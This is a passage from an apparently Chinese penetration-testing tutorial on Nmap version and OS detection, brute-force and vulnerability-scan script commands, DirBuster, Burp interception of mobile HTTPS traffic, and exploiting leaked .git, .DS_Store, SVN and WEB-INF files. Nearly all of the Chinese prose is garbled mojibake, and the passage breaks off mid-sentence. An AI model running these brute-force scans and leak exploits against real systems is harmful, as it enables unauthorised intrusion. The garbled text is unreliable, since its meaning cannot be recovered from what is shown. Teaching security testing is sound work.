300è¡¨ç¤ºæ‰«ææœ€æœ‰å¯èƒ½å¼€æ”¾çš„300ä¸ªç«¯å£ï¼ˆTCPå’ŒUDPåˆ†åˆ«æœ‰300ä¸ªç«¯å£ï¼‰ã€‚ (ä¸‰) ç‰ˆæœ¬**ä¾¦æµ‹** 1) ç‰ˆæœ¬**ä¾¦æµ‹åŸç†**ç®€è¦çš„ä»‹ç»ç‰ˆæœ¬çš„ä¾¦æµ‹åŸç†ã€‚ç‰ˆæœ¬ä¾¦æµ‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š l é¦–å…ˆæ£€æŸ¥openä¸open|filteredçŠ¶æ€çš„ç«¯å£æ˜¯å¦åœ¨æ’é™¤ç«¯å£åˆ—è¡¨å†…ã€‚å¦‚æœåœ¨æ’é™¤åˆ—è¡¨ï¼Œå°†è¯¥ç«¯å£å‰”é™¤ã€‚ l å¦‚æœæ˜¯TCPç«¯å£ï¼Œå°è¯•å»ºç«‹TCPè¿æ¥ã€‚å°è¯•ç­‰å¾…ç‰‡åˆ»ï¼ˆé€šå¸¸6ç§’æˆ–æ›´å¤šï¼Œå…·ä½“æ—¶é—´å¯ä»¥æŸ¥è¯¢æ–‡ä»¶nmap-services-probesä¸­Probe TCP NULL q||å¯¹åº”çš„totalwaitmsï¼‰ã€‚é€šå¸¸åœ¨ç­‰å¾…æ—¶é—´å†…ï¼Œä¼šæ¥æ”¶åˆ°ç›®æ ‡æœºå‘é€çš„â€œWelcomeBannerâ€ä¿¡æ¯ã€‚nmapå°†æ¥æ”¶åˆ°çš„Bannerä¸nmap-services-probesä¸­NULL probeä¸­çš„ç­¾åè¿›è¡Œå¯¹æ¯”ã€‚æŸ¥æ‰¾å¯¹åº”åº”ç”¨ç¨‹åºçš„åå­—ä¸ç‰ˆæœ¬ä¿¡æ¯ã€‚ l å¦‚æœé€šè¿‡â€œWelcome Bannerâ€æ— æ³•ç¡®å®šåº”ç”¨ç¨‹åºç‰ˆæœ¬ï¼Œé‚£ä¹ˆnmapå†å°è¯•å‘é€å…¶ä»–çš„æ¢æµ‹åŒ…ï¼ˆå³ä»nmap-services-probesä¸­æŒ‘é€‰åˆé€‚çš„probeï¼‰ï¼Œå°†probeå¾—åˆ°å›å¤åŒ…ä¸æ•°æ®åº“ä¸­çš„ç­¾åè¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœåå¤æ¢æµ‹éƒ½æ— æ³•å¾—å‡ºå…·ä½“åº”ç”¨ï¼Œé‚£ä¹ˆæ‰“å°å‡ºåº”ç”¨è¿”å›æŠ¥æ–‡ï¼Œè®©ç”¨æˆ·è‡ªè¡Œè¿›ä¸€æ­¥åˆ¤å®šã€‚ l å¦‚æœæ˜¯UDPç«¯å£ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨nmap-services-probesä¸­æ¢æµ‹åŒ…è¿›è¡Œæ¢æµ‹åŒ¹é…ã€‚æ ¹æ®ç»“æœå¯¹æ¯”åˆ†æå‡ºUDPåº”ç”¨æœåŠ¡ç±»å‹ã€‚ l å¦‚æœæ¢æµ‹åˆ°åº”ç”¨ç¨‹åºæ˜¯SSLï¼Œé‚£ä¹ˆè°ƒç”¨openSSLè¿›ä¸€æ­¥çš„ä¾¦æŸ¥è¿è¡Œåœ¨SSLä¹‹ä¸Šçš„å…·ä½“çš„åº”ç”¨ç±»å‹ã€‚ l å¦‚æœæ¢æµ‹åˆ°åº”ç”¨ç¨‹åºæ˜¯SunRPCï¼Œé‚£ä¹ˆè°ƒç”¨brute-force RPC grinderè¿›ä¸€æ­¥æ¢æµ‹å…·ä½“æœåŠ¡ã€‚ 2) ç‰ˆæœ¬**ä¾¦æµ‹ç”¨æ³•**l -sV: æŒ‡å®šè®©Nmapè¿›è¡Œç‰ˆæœ¬ä¾¦æµ‹ l â€“version-intensity : æŒ‡å®šç‰ˆæœ¬ä¾¦æµ‹å¼ºåº¦ï¼ˆ0-9ï¼‰ï¼Œé»˜è®¤ä¸º7ã€‚æ•°å€¼è¶Šé«˜ï¼Œæ¢æµ‹å‡ºçš„æœåŠ¡è¶Šå‡†ç¡®ï¼Œä½†æ˜¯è¿è¡Œæ—¶é—´ä¼šæ¯”è¾ƒé•¿ã€‚ l â€“version-light: æŒ‡å®šä½¿ç”¨è½»é‡ä¾¦æµ‹æ–¹å¼ (intensity 2) l â€“version-all: å°è¯•ä½¿ç”¨æ‰€æœ‰çš„probesè¿›è¡Œä¾¦æµ‹ (intensity 9) l â€“version-trace: æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯ã€‚ 3) ä½¿ç”¨**æ¼”ç¤º**å¯¹ä¸»æœº10.1.1.100è¿›è¡Œç‰ˆæœ¬ä¾¦æµ‹ã€‚ å‘½ä»¤å¦‚ä¸‹ï¼šnmap â€“sV 10.1.1.100 (å››) OSä¾¦æµ‹ 1) OS**ä¾¦æµ‹åŸç†**Nmapä½¿ç”¨TCP/IPåè®®æ ˆæŒ‡çº¹æ¥è¯†åˆ«ä¸åŒçš„æ“ä½œç³»ç»Ÿå’Œè®¾å¤‡ã€‚åœ¨RFCè§„èŒƒä¸­ï¼Œæœ‰äº›åœ°æ–¹å¯¹TCP/IPçš„å®ç°å¹¶æ²¡æœ‰å¼ºåˆ¶è§„å®šï¼Œç”±æ­¤ä¸åŒçš„TCP/IPæ–¹æ¡ˆä¸­å¯èƒ½éƒ½æœ‰è‡ªå·±çš„ç‰¹å®šæ–¹å¼ã€‚Nmapä¸»è¦æ˜¯æ ¹æ®è¿™äº›ç»†èŠ‚ä¸Šçš„å·®å¼‚æ¥åˆ¤æ–­æ“ä½œç³»ç»Ÿçš„ç±»å‹çš„ã€‚å…·ä½“å®ç°æ–¹å¼å¦‚ä¸‹ï¼šNmapå†…éƒ¨åŒ…å«äº†2600å¤šå·²çŸ¥ç³»ç»Ÿçš„æŒ‡çº¹ç‰¹å¾ï¼ˆåœ¨æ–‡ä»¶nmap-os-dbæ–‡ä»¶ä¸­ï¼‰ã€‚å°†æ­¤æŒ‡çº¹æ•°æ®åº“ä½œä¸ºè¿›è¡ŒæŒ‡çº¹å¯¹æ¯”çš„æ ·æœ¬åº“ã€‚åˆ†åˆ«æŒ‘é€‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£ï¼Œå‘å…¶å‘é€ç»è¿‡ç²¾å¿ƒè®¾è®¡çš„TCP/UDP/ICMPæ•°æ®åŒ…ï¼Œæ ¹æ®è¿”å›çš„æ•°æ®åŒ…ç”Ÿæˆä¸€ä»½ç³»ç»ŸæŒ‡çº¹ã€‚å°†æ¢æµ‹ç”Ÿæˆçš„æŒ‡çº¹ä¸nmap-os-dbä¸­æŒ‡çº¹è¿›è¡Œå¯¹æ¯”ï¼ŒæŸ¥æ‰¾åŒ¹é…çš„ç³»ç»Ÿã€‚å¦‚æœæ— æ³•åŒ¹é…ï¼Œä»¥æ¦‚ç‡å½¢å¼åˆ—ä¸¾å‡ºå¯èƒ½çš„ç³»ç»Ÿã€‚ 2) OS**ä¾¦æµ‹ç”¨æ³•**l -O: æŒ‡å®šNmapè¿›è¡ŒOSä¾¦æµ‹ã€‚ l â€“osscan-limit: é™åˆ¶Nmapåªå¯¹ç¡®å®šçš„ä¸»æœºçš„è¿›è¡ŒOSæ¢æµ‹ï¼ˆè‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£ï¼‰ã€‚ l â€“osscan-guess: å¤§èƒ†çŒœæµ‹å¯¹æ–¹çš„ä¸»æœºçš„ç³»ç»Ÿç±»å‹ã€‚ç”±æ­¤å‡†ç¡®æ€§ä¼šä¸‹é™ä¸å°‘ï¼Œä½†ä¼šå°½å¯èƒ½å¤šä¸ºç”¨æˆ·æä¾›æ½œåœ¨çš„æ“ä½œç³»ç»Ÿã€‚ 3) ä½¿ç”¨**æ¼”ç¤º**å‘½ä»¤ï¼šnmap â€“O 10.1.1.100 (äº”) æ¼æ´æ‰«æ æ‰«æç«¯å£å¹¶ä¸”æ ‡è®°å¯ä»¥çˆ†ç ´çš„æœåŠ¡ nmap ç›®æ ‡ â€“script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute åˆ¤æ–­å¸¸è§çš„æ¼æ´å¹¶æ‰«æç«¯å£ nmap ç›®æ ‡ â€“script=auth,vuln ç²¾ç¡®åˆ¤æ–­æ¼æ´å¹¶æ‰«æç«¯å£ nmap ç›®æ ‡ â€“script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version 1.2.4 Nmap**çš„ä¼˜åŠ£åŠ¿**ä¼˜åŠ¿ï¼š l åŠŸèƒ½çµæ´»å¼ºå¤§ï¼Œæ”¯æŒå¤šç§ç›®æ ‡ï¼Œå¤§é‡è®¡ç®—æœºçš„åŒæ—¶æ‰«æï¼› l å¼€æºï¼Œç›¸å…³å¸®åŠ©æ–‡æ¡£ååˆ†è¯¦ç»†ï¼› l æµè¡Œï¼Œç”±äºå…¶å…·æœ‰å¼ºå¤§çš„æ‰«ææœºæ¢æµ‹åŠŸèƒ½ï¼Œï¼Œå·²è¢«æˆåƒä¸Šä¸‡å®‰å…¨ä¸“å®¶ä½¿ç”¨ã€‚ åŠ£åŠ¿ï¼š l Nmapå‚æ•°ä¼—å¤šï¼Œéš¾ä»¥ä¸€ä¸€è®°å¿†ï¼› 1.8 DirB**uster**1.8.1 åŠŸèƒ½**ä»‹ç»**DirBusteræ˜¯ä¸€æ¬¾è·¯å¾„åŠç½‘é¡µæš´åŠ›ç ´è§£çš„å·¥å…·,å¯ä»¥ç ´è§£å‡ºä¸€ç›´æ²¡æœ‰è®¿é—®è¿‡æˆ–è€…ç®¡ç†å‘˜åå°çš„ç•Œé¢è·¯å¾„ã€‚ 1.8.2 éƒ¨ç½²**æŒ‡å—**Javaè¿è¡Œç¯å¢ƒ+DirBusterç¨‹åºåŒ… 1.8.3 å®æˆ˜è¯¦ç»†æ•™ç¨‹ï¼Œå‚è§ï¼š https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project http://sourceforge.net/projects/dirbuster/ l åŒå‡»è¿è¡ŒDirBuster.jar l åœ¨URLä¸­è¾“å…¥ç›®æ ‡URLæˆ–è€…ä¸»æœºIPåœ°å€ l åœ¨file with list of dirs/files æ åç‚¹å‡»browseï¼Œé€‰æ‹©ç ´è§£çš„å­—å…¸åº“ä¸ºdirectory-list-2.3-small.txt l å°†File extensionä¸­å¡«å…¥æ­£ç¡®çš„æ–‡ä»¶åç¼€ï¼Œé»˜è®¤ä¸ºphpï¼Œå¦‚æœä¸ºjspé¡µé¢ï¼Œéœ€è¦å¡«å…¥jsp l å…¶ä»–é€‰é¡¹ä¸å˜ï¼Œç‚¹å‡»å³ä¸‹è§’çš„startï¼Œå¯åŠ¨ç›®å½•æŸ¥æ‰¾ l è§‚å¯Ÿè¿”å›ç»“æœï¼Œå¯ç‚¹å‡»å³ä¸‹è§’çš„reportï¼Œç”Ÿæˆç›®å½•æŠ¥å‘Š 1.8.4 DirBuster**ä¼˜ç¼ºç‚¹**ä¼˜ç‚¹ï¼š l æ•æ„Ÿç›®å½•å‘æ˜èƒ½åŠ›å¼º l OWASPå®‰å…¨æœºæ„æåŠ›æ¨è ç¼ºç‚¹ï¼š l ç¨‹åºè¿è¡Œçº¿ç¨‹å° l æ¢æµ‹ç›®å½•ä¾èµ–å­—å…¸æ–‡ä»¶ 1.9 æŒ‡çº¹è¯†åˆ« 1.10 æ‰©å±•ï¼šBurp APPæŠ“åŒ…ä¸€ã€**æ‰‹æœºç«¯é…ç½®** **1.**è®©å®‰å“æ‰‹æœºå’Œç”µè„‘è¿å…¥åŒä¸€ä¸ªWIFIï¼Œå³æ˜¯åœ¨åŒä¸€ä¸ªæ— çº¿å±€åŸŸç½‘ç¯å¢ƒä¸‹ã€‚ **2.**æŸ¥çœ‹ç”µè„‘çš„æœ¬åœ°IPåœ°å€ï¼Œå‘½ä»¤è¡Œä¸‹è¾“å…¥ipconfigã€‚ æ— çº¿å±€åŸŸç½‘çš„IPåœ°å€**3.**è®¾ç½®æ‰‹æœºä»£ç†IPï¼Œæˆ‘è¿™é‡Œä»¥oppoç³»ç»Ÿä¸ºä¾‹ã€‚ ä»£ç†è®¾ç½®ä¸ºâ€œæ‰‹åŠ¨â€ï¼Œè®¾ç½®ä¸»æœºåä¸ºç”µè„‘æ— çº¿å±€åŸŸç½‘IPåœ°å€ï¼Œç«¯å£å¯ä»¥éšä¾¿è®¾ç½®ï¼Œå…¶ä»–çš„è®¾ç½®å¯ä»¥é»˜è®¤ã€‚ äºŒã€**ç”µè„‘ç«¯é…ç½®** **1.**æ‰“å¼€Burpsuiteï¼Œè®¾ç½®Burp suiteä»£ç†æœåŠ¡å™¨ï¼Œç‚¹å‡»â€œProxyâ€ç„¶åâ€œOptionsâ€ ç‚¹å‡»â€œaddâ€æ·»åŠ å’Œæ‰‹æœºä¸€æ ·çš„IPåœ°å€å’Œç«¯å£ï¼Œè¦è·Ÿæ‰‹æœºä¸Šè®¾ç½®çš„é‚£ä¸ªç«¯å£ä¸€è‡´ã€‚è®°å¾—å‹¾ä¸Šå‰é¢çš„æ‹¬å·ã€‚**2.**è®¾ç½®å¥½äº†åï¼Œåœ¨â€œProxyâ€ï¼šã€‰â€œInterceptâ€ä¸‹å¼€å¯â€œIntercept is onâ€å°±å¯ä»¥å¯¹å®‰å“APPçš„ç½‘ç»œæ•°æ®è¿›è¡ŒæŠ“åŒ…äº†ã€‚ ä¸‰ã€è¯ä¹¦å®‰è£… â€‹ æŠ“å–HTTPSåŒ…éœ€è¦å¯¼å…¥Burpçš„è¯ä¹¦ã€‚**ç‰¹åˆ«æ³¨æ„ï¼šä¸€ä¸ªBurpå¯¹åº”ä¸€ä¸ªè¯ä¹¦ï¼Œå°±æ˜¯ç”¨å“ªä¸ªBurpæŠ“åŒ…å°±å¯¼å‡ºå“ªä¸ªçš„è¯ä¹¦ï¼Œå¹¶å°†è¯¥è¯ä¹¦åœ¨æ‰‹æœºä¸Šå®‰è£…ã€‚éå¸¸é‡è¦ï¼Œå› ä¸ºä»¥å‰æŠ“åŒ…å®‰è¿‡è¯ä¹¦ä½†æ˜¯ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªBurpå¯¼è‡´æŠ“åŒ…å¤±è´¥ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚** å¯¼å‡ºBurpè¯ä¹¦æ­¥éª¤ä¸ºï¼š Proxyâ€”Optionsâ€”-import\\export CA é€‰æ‹©ç¬¬ä¸€ä¸ªï¼Œç„¶ånext é€‰æ‹©ä¿å­˜çš„CAè·¯å¾„ï¼Œ**æ–‡ä»¶åç¼€å‘½åä¸º.cerï¼Œéå¸¸é‡è¦ï¼Œå› ä¸ºæ‰‹æœºåªèƒ½å®‰è£….cerçš„è¯ä¹¦ç±»å‹ï¼Œé»˜è®¤çš„deræ ¼å¼æ˜¯ä¸èƒ½è¢«è¯†åˆ«å®‰è£…çš„ã€‚** å°†è¯ä¹¦å‘é€åˆ°æ‰‹æœºï¼Œæˆ‘æ˜¯ç›´æ¥å¾®ä¿¡å‘é€çš„ï¼Œç„¶ååœ¨å¾®ä¿¡ä¸­ä¸‹è½½ï¼Œå¹¶è®°ä½ä¸‹è½½çš„ç›®å½•ã€‚ æ‰¾åˆ°ä¸‹è½½çš„ç›®å½•ï¼Œå°†è¯ä¹¦æ–‡ä»¶å¤åˆ¶åˆ°æ‰‹æœºå­˜å‚¨çš„**æ ¹ç›®å½•**ã€‚ æ‰“å¼€æ‰‹æœºè®¾ç½®â€“å…¶å®ƒè®¾ç½®â€“å®‰å…¨å’Œéšç§â€“æ›´å¤šå®‰å…¨è®¾ç½®â€“ä»SDå¡å®‰è£… åˆ°æ ¹ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°.ceræ–‡ä»¶ï¼Œå®‰è£….cerè¯ä¹¦ï¼Œé‡å‘½åä¸ªåå­— æˆåŠŸå®‰è£…åï¼Œå¯ä»¥åœ¨æ‰‹æœºâ€”-è®¾ç½®â€”-å®‰å…¨å’Œéšç§â€”-æ›´å¤šå®‰å…¨è®¾ç½®â€”-å—ä¿¡ä»»çš„å‡­æ®â€”-ç”¨æˆ·â€”-çœ‹åˆ°PortSwiggeræ–‡ä»¶ã€‚ è‡³æ­¤ï¼Œå®‰è£…å®Œæˆã€‚å…¨éƒ¨å·¥ä½œå®Œæˆï¼Œå¯ä»¥æ‰“å¼€burpï¼Œå‡†å¤‡æŠ“åŒ…äº†ã€‚ 1.11 æ‰©å±•:å¸¸è§ä¿¡æ¯æ³„éœ²åˆ©ç”¨æ–¹æ³•ä¸€ã€Gitå¯¼è‡´æ–‡ä»¶æ³„éœ² â€‹ ç”±äºç›®å‰çš„ web é¡¹ç›®çš„å¼€å‘é‡‡ç”¨å‰åç«¯å®Œå…¨åˆ†ç¦»çš„æ¶æ„:å‰ç«¯å…¨éƒ¨ä½¿ç”¨é™æ€æ–‡ä»¶ï¼Œå’Œåç«¯ä»£ç å®Œå…¨åˆ†ç¦»ï¼Œéš¶å±ä¸¤ä¸ªä¸åŒçš„é¡¹ç›®ã€‚è¡¨æ€æ–‡ä»¶ä½¿ç”¨ git æ¥è¿›è¡ŒåŒæ­¥å‘å¸ƒåˆ°æœåŠ¡å™¨ï¼Œç„¶åä½¿ç”¨nginx æŒ‡å‘åˆ°æŒ‡å®šç›®å½•ï¼Œä»¥è¾¾åˆ°è¢«å…¬ç½‘è®¿é—®çš„ç›®çš„ã€‚ åœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç  äºŒã€DS_storeå¯¼è‡´æ–‡ä»¶æ³„éœ² â€‹ .DS_Storeæ˜¯Macä¸‹Finderç”¨æ¥ä¿å­˜å¦‚ä½•å±•ç¤ºæ–‡ä»¶//æ–‡ä»¶å¤¹çš„æ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯¹åº”ä¸€ä¸ªã€‚ç”±äºå¼€å‘/è®¾è®¡äººå‘˜åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„æ¼ã€æºä»£ç æ–‡ä»¶ç­‰æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚æˆ‘ä»¬å¯ä»¥æ¨¡ä»¿ä¸€ä¸ªç¯å¢ƒï¼Œåˆ©ç”¨phpstudyæ­å»ºPHPç¯å¢ƒï¼ŒæŠŠ.DS_storeæ–‡ä»¶ä¸Šä¼ åˆ°ç›¸å…³ç›®å½•ã€‚ ç„¶ååˆ©ç”¨å·¥å…·è¿›è¡Œç›¸å…³æ£€æµ‹å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/lijiejie/ds_store_expä¸ºäº†è®©å®éªŒæ›´çœŸå®ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œç„¶åå»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸ºadminå’Œä¸€ä¸ªhelloæ–‡ä»¶å¤¹ï¼Œåˆ©ç”¨è¯¥å·¥å…·è¿è¡Œå®Œä»¥åï¼ŒæŸ¥çœ‹å·¥å…·æ–‡ä»¶å¤¹æŸ¥çœ‹æœ‰ä»€ä¹ˆç»“æœã€‚ æ­¤æ–‡ä»¶å’Œæˆ‘ä»¬åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹å†…ï¼Œå¦‚æœæ˜¯è‹¹æœç”¨æˆ·ï¼ŒæŠŠæ–‡ä»¶copyåˆ°ç›¸å…³æœåŠ¡å™¨ç›®å½•ä»¥åï¼Œéƒ½ä¼šé»˜è®¤å¸¦ä¸€ä¸ªæ–‡ä»¶.DS_Storeã€‚é¦–å…ˆè®¿é—®test.phpæ–‡ä»¶ï¼ŒæŸ¥çœ‹ç¯å¢ƒæ˜¯å¦æˆåŠŸã€‚ ç¯å¢ƒæ­å»ºæˆåŠŸ æˆ‘ä»¬åˆ©ç”¨å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œè¿è¡Œå®Œå¦‚ä¸Šå›¾ï¼Œè¿è¡Œå®Œä»¥åæˆ‘ä»¬å¯ä»¥åˆ°å·¥å…·ç›®å½•è¿›è¡ŒæŸ¥çœ‹ è¿™æ˜¯ä¸€ä¸ª.DS_Storeæ–‡ä»¶æ³„æ¼åˆ©ç”¨è„šæœ¬ï¼Œå®ƒè§£æ.DS_Storeæ–‡ä»¶å¹¶é€’å½’åœ°ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ã€‚ ä¸‰ã€SVNå¯¼è‡´æ–‡ä»¶æ³„éœ² â€‹ Subversionï¼Œç®€ç§°SVNï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç›¸å¯¹äºçš„RCSã€CVSï¼Œé‡‡ç”¨äº†åˆ†æ”¯ç®¡ç†ç³»ç»Ÿï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡å°±æ˜¯å–ä»£CVSã€‚äº’è”ç½‘ä¸Šè¶Šæ¥è¶Šå¤šçš„æ§åˆ¶æœåŠ¡ä»CVSè½¬ç§»åˆ°Subversionã€‚ Subversionä½¿ç”¨æœåŠ¡ç«¯â€”å®¢æˆ·ç«¯çš„ç»“æ„ï¼Œå½“ç„¶æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯å¯ä»¥éƒ½è¿è¡Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚åœ¨æœåŠ¡ç«¯æ˜¯å­˜æ”¾ç€æ‰€æœ‰å—æ§åˆ¶æ•°æ®çš„Subversionä»“åº“ï¼Œå¦ä¸€ç«¯æ˜¯Subversionçš„å®¢æˆ·ç«¯ç¨‹åºï¼Œç®¡ç†ç€å—æ§æ•°æ®çš„ä¸€éƒ¨åˆ†åœ¨æœ¬åœ°çš„æ˜ å°„ï¼ˆç§°ä¸ºâ€œå·¥ä½œå‰¯æœ¬â€ï¼‰ã€‚åœ¨è¿™ä¸¤ç«¯ä¹‹é—´ï¼Œæ˜¯é€šè¿‡å„ç§ä»“åº“å­˜å–å±‚ï¼ˆRepository Accessï¼Œç®€ç§°RAï¼‰çš„å¤šæ¡é€šé“è¿›è¡Œè®¿é—®çš„ã€‚è¿™äº›é€šé“ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¸åŒçš„ç½‘ç»œåè®®ï¼Œä¾‹å¦‚HTTPã€SSHç­‰ï¼Œæˆ–æœ¬åœ°æ–‡ä»¶çš„æ–¹å¼æ¥å¯¹ä»“åº“è¿›è¡Œæ“ä½œã€‚SVNæ¼æ´åœ¨å®é™…æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œåˆ©ç”¨åˆ°ä¹Ÿæ¯”è¾ƒå¤šï¼Œç”±äºä¸€äº›å¼€å‘ç®¡ç†å‘˜ç–å¿½é€ æˆï¼ŒåŸç†ç±»ä¼¼DS_Storeæ¼æ´ã€‚æˆ‘ä»¬è¿™é‡Œä¸å†è¿›è¡Œæ­å»ºç¯å¢ƒï¼Œç»™å¤§å®¶æ¨èå·¥å…·ï¼Œåˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š æ¼æ´åˆ©ç”¨å·¥å…·ï¼š Seay SVNæ¼æ´åˆ©ç”¨å·¥å…· æ·»åŠ ç½‘ç«™urlåœ¨è¢«åˆ©ç”¨çš„ç½‘å€åé¢åŠ  /.svn/entriesï¼Œåˆ—å‡ºç½‘ç«™ç›®å½•ï¼Œç”šè‡³ä¸‹è½½æ•´ç«™ä¸‹è½½åœ°å€ï¼šhttps://pan.baidu.com/s/1jGA98jG å››**ã€WEB-INF/web.xmlæ³„éœ²** WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚ /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚ /WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ åŸå› ï¼šé€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å– 1.12 æ‰©å±•: ZoomEye hackâ€‹ ZoomEye æ”¯æŒå…¬ç½‘è®¾å¤‡æŒ‡çº¹æ£€ç´¢å’Œ WebæŒ‡çº¹æ£€ç´¢çš„ç½‘ç«™ï¼ŒæŒ‡çº¹æ£€ç´¢åŒ…æ‹¬åº”ç”¨åç§°ã€ç‰ˆæœ¬ã€å‰ç«¯æ¡†æ¶ã€åç«¯æ¡†æ¶ã€æœåŠ¡ç«¯è¯­è¨€ã€æœåŠ¡å™¨æ“ä½œç³»ç»Ÿã€ç½‘ç«™å®¹å™¨ã€å†…å®¹ç®¡ç†ç³»ç»Ÿå’Œæ•°æ®åº“ç­‰ã€‚è®¾å¤‡æŒ‡çº¹åŒ…æ‹¬åº”ç”¨åã€ç‰ˆæœ¬ã€å¼€æ”¾ç«¯å£ã€æ“ä½œç³»ç»Ÿã€æœåŠ¡åã€åœ°ç†ä½ç½®ç­‰ã€‚ 1**ã€å®æˆ˜æœç´¢** æˆ‘ä»¬ä»Šå¤©ä¸»è¦è®²ä¸‹å¦‚ä½•ä½¿ç”¨ä»–çš„è¯­æ³•è§„åˆ™å»é«˜çº§æœç´¢ï¼Œæœç´¢æœ‰ç”¨ä¿¡æ¯ã€‚ Â· ä¸»æœºè®¾å¤‡æœç´¢ç»„ä»¶åç§°app: ç»„ä»¶åver: 